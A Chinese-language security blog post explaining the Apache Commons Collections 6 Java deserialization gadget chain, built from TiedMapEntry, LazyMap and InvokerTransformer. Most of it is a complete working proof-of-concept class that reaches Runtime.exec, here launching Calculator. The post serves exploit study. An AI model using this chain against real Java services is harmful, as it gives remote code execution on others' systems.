# CommonsCollections6链详解

  
  
世界上最好用的 CC 链  
&lt;!--more--&gt;  
## CommonsCollections6 详解  
CommonsCollections1 的链子调用了`LazyMap`类中的`transform()`方法，于是找一个任意类调用`get()`方法的地方，这里换到了`TideMapEntry`类  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151516691.png)  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151516403.png)  
这里的`hashCode()`方法里调用了`getValue()`方法里面调用了`get()`方法，并且`map`可控，这里的`hashCode()`很熟悉，因为在`URLDNS`链中`HashMap`类里的`readObject()`方法调用到了`hashCode()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151518932.png)  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151518990.png)  
于是构造`poc`  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.keyvalue.TiedMapEntry;    
import org.apache.commons.collections.map.LazyMap;    
    
import java.io.FileInputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections6 {    
    public static void main(String[] args) throws Exception{    
    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer(&#34;getMethod&#34;, new Class[]{String.class, Class[].class}, new Object[]{&#34;getRuntime&#34;, null}),    
                new InvokerTransformer(&#34;invoke&#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),    
                new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;})    
        };    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();    
        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, new ConstantTransformer(1));    
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, &#34;test&#34;);    
    
        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();    
        map2.put(tiedMapEntry,&#34;test1&#34;);    
    
        lazymap.remove(&#34;test&#34;);    
    
        Class c = LazyMap.class;    
        Field factoryField = c.getDeclaredField(&#34;factory&#34;);    
        factoryField.setAccessible(true);    
        factoryField.set(lazymap,chainedTransformer);    
        //serialize(map2);    
        unserialize(&#34;ser.bin&#34;);    
    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;ser.bin&#34;));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151528159.png)  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/  

